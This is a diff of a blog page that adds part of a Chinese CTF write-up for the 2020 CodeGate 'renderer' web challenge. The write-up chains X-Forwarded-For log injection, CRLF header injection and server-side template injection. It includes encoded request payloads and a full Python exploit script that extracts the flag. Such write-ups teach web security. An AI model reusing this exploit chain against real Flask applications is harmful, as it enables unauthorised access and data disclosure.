+<p>跟进函数实现：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_real_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> request.headers.get(<span class="string">"X-Forwarded-For"</span>) <span class="keyword">or</span> get_ip()</span><br></pre></td></tr></table></figure></p>
+<p>发现可用XFF控制写入log内容。<br>跟进write_log：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_log</span><span class="params">(rip)</span>:</span></span><br><span class="line">    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"/home/tickets/%s"</span> % tid, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        log_str = <span class="string">"Admin page accessed from %s"</span> % rip</span><br><span class="line">        f.write(log_str)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> tid</span><br></pre></td></tr></table></figure></p>
+<p>故此，可以尝试在/admin路由，利用XFF写入文件，同时会返回其ticket:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1/renderer/admin+HTTP/1.1%0aX-Forwarded-For: &#123;&#123;1+1&#125;&#125;%0a</span><br></pre></td></tr></table></figure></p>
+<p><img src="./_image/2020-02-09/2020-02-09-11-53-23.png" alt=""><br>而后，利用/admin/ticket读取文件，触发ssti:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#proxy doesn't allow to show ticket</span></span><br><span class="line">        <span class="keyword">print</span> <span class="number">1</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"127.0.0.1"</span>, <span class="string">"127.0.0.2"</span>]: <span class="comment">#only local</span></span><br><span class="line">        <span class="keyword">print</span> <span class="number">2</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">"User-Agent"</span>) != <span class="string">"AdminBrowser/1.337"</span>:</span><br><span class="line">        <span class="keyword">print</span> request.headers.get(<span class="string">"User-Agent"</span>)</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">"ticket"</span>):</span><br><span class="line">        log = read_log(request.args.get(<span class="string">"ticket"</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> log:</span><br><span class="line">            <span class="keyword">print</span> <span class="number">4</span></span><br><span class="line">            abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(log)</span><br></pre></td></tr></table></figure></p>
+<p>构造exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = http://127.0.0.1/renderer/admin/ticket?ticket=c0105720c3cd521aadd35064b24db9699b2bc646+HTTP/1.1%0aUser-Agent: AdminBrowser/1.337%0aX-Forwarded-For: 127.0.0.1%0aA: B%0a</span><br></pre></td></tr></table></figure></p>
+<p><img src="./_image/2020-02-09/2020-02-09-12-18-40.png" alt=""><br>测试发现，确实可以伪造http header。但是此处存在一个问题，即UA覆盖，最下面的UA，会覆盖我们上面的UA，所以得Connection: close。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = http://127.0.0.1/renderer/admin/ticket?ticket=c0105720c3cd521aadd35064b24db9699b2bc646 HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: AdminBrowser/1.337%0d%0aX-Forwarded-For: 127.0.0.1%0d%0aConnection: close%0d%0a%0d%0askycool</span><br></pre></td></tr></table></figure></p>
+<p><img src="./_image/2020-02-09/2020-02-09-12-26-34.png" alt=""><br>即可触发ssti:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.args.get(<span class="string">"ticket"</span>):</span><br><span class="line">    log = read_log(request.args.get(<span class="string">"ticket"</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> log:</span><br><span class="line">        <span class="keyword">print</span> <span class="number">4</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(log)</span><br></pre></td></tr></table></figure></p>
+<p><img src="./_image/2020-02-09/2020-02-09-12-51-39.png" alt=""><br>发现flag位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENV FLAG CODEGATE2020&#123;**DELETED**&#125;</span><br></pre></td></tr></table></figure></p>
+<p>exp如下:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'http://58.229.253.144/renderer/'</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'''http://127.0.0.1/renderer/admin HTTP/1.1%%0d%%0aX-Forwarded-For: %s%%0d%%0a'''</span></span><br><span class="line">payload2 = <span class="string">'''http://127.0.0.1/renderer/admin/ticket?ticket=%s HTTP/1.1%%0d%%0aHost: 127.0.0.1%%0d%%0aUser-Agent: AdminBrowser/1.337%%0d%%0aX-Forwarded-For: 127.0.0.1%%0d%%0aConnection: close%%0d%%0a%%0d%%0askycool'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssti_payload = <span class="string">'''&#123;&#123;config&#125;&#125;'''</span></span><br><span class="line"></span><br><span class="line">exp1 = payload1 % ssti_payload</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">'url'</span>:urllib.unquote(exp1)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line">ticket = r.content[<span class="number">1652</span>:<span class="number">1692</span>]</span><br><span class="line">exp2 = payload2%ticket</span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">'url'</span>:urllib.unquote(exp2)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p>
+<p>运行即可拿到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CODEGATE2020&#123;CrLfMakesLocalGreatAgain&#125;</span><br></pre></td></tr></table></figure></p>
 
     </article>
     <!-- reward  -->
@@ -438,16 +445,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest–Gradient-Boosting-Decision-Tree-Algorithm/" title= "Paper Summary & Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm">
-                    <div class="nextTitle">Paper Summary & Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm</div>
+                <a href= "/2020/04/29/Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing/" title= "Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing">
+                    <div class="nextTitle">Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2020/01/13/Paper-Summary-Evaluating-CNN-and-LSTM-for-Web-Attack-Detection/" title= "Paper Summary & Evaluating CNN and LSTM for Web Attack Detection">
-                    <div class="prevTitle">Paper Summary & Evaluating CNN and LSTM for Web Attack Detection</div>
+                <a href= "/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest–Gradient-Boosting-Decision-Tree-Algorithm/" title= "Paper Summary & Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm">
+                    <div class="prevTitle">Paper Summary & Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm</div>
                 </a>
             
         </li>
@@ -569,7 +576,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#背景知识"><span class="toc-number">2.</span> <span class="toc-text">背景知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Browser-Cache-Poisoning"><span class="toc-number">3.</span> <span class="toc-text">User Browser Cache Poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Server-Cache-Poisoning"><span class="toc-number">4.</span> <span class="toc-text">Server Cache Poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Cache-Deception"><span class="toc-number">5.</span> <span class="toc-text">Web Cache Deception</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP"><span class="toc-number">1.</span> <span class="toc-text">CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#renderer"><span class="toc-number">2.</span> <span class="toc-text">renderer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XFF可控"><span class="toc-number">2.1.</span> <span class="toc-text">XFF可控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF注入"><span class="toc-number">2.2.</span> <span class="toc-text">CRLF注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#目录穿越"><span class="toc-number">2.3.</span> <span class="toc-text">目录穿越</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -582,24 +589,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -4378,12 +4367,37 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/14</span><a class="archive-post-title" href= "/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest–Gradient-Boosting-Decision-Tree-Algorithm/" >Paper Summary & Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/2020/05/29/Deemon & CSRF漏洞动态分析工具/" >Paper Summary & Deemon & Detecting CSRF with Dynamic Analysis and Property Graphs</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/14</span><a class="archive-post-title" href= "/2020/01/14/Web缓存利用分析(一)/" >Web缓存利用分析(一)</a>
+            <span class="archive-post-date">05/14</span><a class="archive-post-title" href= "/2020/05/14/Web缓存利用分析(一)/" >Web缓存利用分析(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/05</span><a class="archive-post-title" href= "/2020/05/05/Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications/" >Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2020/05/03/2020 De1CTF & Animal Crossing/" >2020 De1CTF & Animal Crossing</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href= "/2020/04/29/Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing/" >Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/09</span><a class="archive-post-title" href= "/2020/02/09/2020 CodeGate Web Writeup/" >2020 CodeGate Web Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/14</span><a class="archive-post-title" href= "/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest–Gradient-Boosting-Decision-Tree-Algorithm/" >Paper Summary & Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm</a>
         </li>
     
     
@@ -4394,31 +4408,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/2020/01/13/Paper-Summary-Detecting-Webshell-Based-on-Random-Forest-with-FastText/" >Paper Summary & Detecting Webshell Based on Random Forest with FastText</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/2020 CodeGate Web Writeup/" >2020 CodeGate Web Writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/2020 De1CTF & Animal Crossing/" >2020 De1CTF & Animal Crossing</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/Deemon & CSRF漏洞动态分析工具/" >Paper Summary & Deemon & Detecting CSRF with Dynamic Analysis and Property Graphs</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing/" >Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications/" >Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications</a>
         </li>
     
     
@@ -5450,12 +5439,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
         </li>
     
     
@@ -5488,27 +5477,27 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
     
-        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
-    
         <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
     
         <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
     
         <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
     
         <span class="sidebar-tag-name" data-tags="study"><span class="iconfont-archer">&#xe606;</span>study</span>
     
+        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
+    
         <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
     
-        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
+        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
+    
+        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
     
         <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
     
         <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
-    
-        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
-    
-        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
     
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
@@ -5583,9 +5572,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="misc"><span class="iconfont-archer">&#xe60a;</span>misc</span>
     
-        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
-    
         <span class="sidebar-category-name" data-categories="paper"><span class="iconfont-archer">&#xe60a;</span>paper</span>
+    
+        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
     
         <span class="sidebar-category-name" data-categories="cms"><span class="iconfont-archer">&#xe60a;</span>cms</span>
     
